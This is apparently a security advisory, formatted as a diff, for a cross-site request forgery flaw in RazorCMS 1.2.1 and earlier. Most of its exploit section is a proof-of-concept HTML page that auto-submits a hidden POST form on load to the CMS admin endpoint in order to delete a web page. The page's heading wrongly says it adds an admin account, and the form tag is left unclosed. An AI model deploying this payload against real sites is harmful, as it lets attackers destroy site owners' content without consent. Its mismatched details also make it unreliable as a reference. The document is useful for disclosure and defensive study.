@@ -1,0 +1,37 @@
++------------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title : RazorCMS <= 1.2.1 STABLE CSRF (Delete Web Pages)
+# Date          : 08-03-2012
+# Author        : Ivano Binetti (http://www,ivanobinetti.com)
+# Software link : http://www.razorcms.co.uk/archive/core/razorCMS_core_v1_2_1_STABLE.zip
+# Vendor site   : http://www.razorcms.co.uk/
+# Version       : 1.2.1 STABLE and lower 
+# Tested on     : Debian Squeeze (6.0) 
++------------------------------------------------------------------------------------------------------------------------------------+
+
+Summary
+1)Introduction
+2)Vulnerabilities Description
+3)Exploit (Delete Web Page) 
+  
++------------------------------------------------------------------------------------------------------------------------------------+
+1)Introduction
+"razorCMS is ideally suited to small to medium website projects, it can be run without need for a database, due to it's flat file
+structure it has no need for a database meaning it can also be a cost effected method in content management, allowing it to be 
+used on the cheapest of web hosts, or even free hosting".
+
+2)Vulnerabilities Description
+RazorCMS 1.2.1 STABLE (and lower)  is affected by CSRF Vulnerability which allows an attacker to delete web pages, both published 
+and unpublished.
+
+3)Exploit (Delete Web Page)  
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<H2>CSRF Exploit to add ADMIN account</H2>
+<form method="POST" name="form0" action="http://<razorcms_ip>:80/razorcms/admin/?action=showcats&unpub=true&slabID=2&catname=sidebar">
+</body>
+</html>
+
+In this POC I've deleted web page with ID=2 
+ 
++------------------------------------------------------------------------------------------------------------------------------------+
+  
